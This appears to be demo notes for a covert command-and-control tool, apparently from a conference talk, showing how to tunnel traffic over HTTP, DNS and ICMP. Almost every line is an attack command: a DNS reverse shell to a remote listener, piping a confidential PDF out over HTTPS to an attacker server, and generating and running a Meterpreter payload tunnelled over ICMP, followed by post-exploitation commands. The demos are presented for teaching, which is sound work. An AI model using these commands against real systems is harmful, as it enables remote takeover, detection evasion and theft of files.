# DEMO 1: HTTP IO

## GET (Default)

Server:
```
./ms.py -m io:http -k bitup2020
```

Client:
```
./mc.py -m io:http -k bitup2020
```

## GET (CUSTOM HEADER)

Server:
```
./ms.py -m io:http -k bitup2020 -w "--header laravel_session"
```

Client:
```
./mc.py -m io:http -w "--header laravel_session" -k bitup2020
```

Wireshark:
http && ip.src == 127.0.0.1 && ip.dst == 127.0.0.1

# DEMO 2: DNS SHELL

## TXT Query

Server:
```
./ms.py -m io:dns -s "--hostname 0.0.0.0 --port 5553" -k bitup2020 -vv
```

Client:
```
.\mc.exe -m shell:dns -w "--hostname 192.168.43.79 --port 5553" -k bitup2020
```

dns && udp.port == 5553

# DEMO 3: File Exfil over HTTPS

Server:
```
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes

./ms.py -m io:http -s "--hostname 0.0.0.0 --port 4443 --ssl --ssl-cert server.pem" -k bitup2020 -vvv > confidential.pdf
```

Client (from CMD)
```
type "confidential.pdf" | .\mc.exe -m io:http -w "--hostname 192.168.43.79 --port 4443 --ssl" -k bitup2020
```

Client (from Powershell)
```
Get-FileHash -Algorithm md5 .\confidential.pdf
```

Server:
```
md5sum ./confidential.pdf
```

Wireshark:
ssl && tcp.port == 4443

# DEMO 4: Meterpreter over ICMP

Payload:
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f exe -o mtpt_localhost_4444.exe
```

Server:
```
(msfconsole) handler -p windows/x64/meterpreter_reverse_tcp -P 5555 -H 127.0.0.1

sudo ./ms.py -m tcpconnect:icmp -s "--iface eth0" -k bitup2020 -o "--address 127.0.0.1 --port 5555" -vv
```

Client:
```
.\mc.exe -m tcplisten:icmp -w "--hostname 10.0.3.15" -o "--address 127.0.0.1 --port 4444" -k bitup2020

.\mtpt_localhost_4444.exe
```

Metasploit:
```
sysinfo
getuid
ps
load powershell
powershell_shell
Get-Host
```
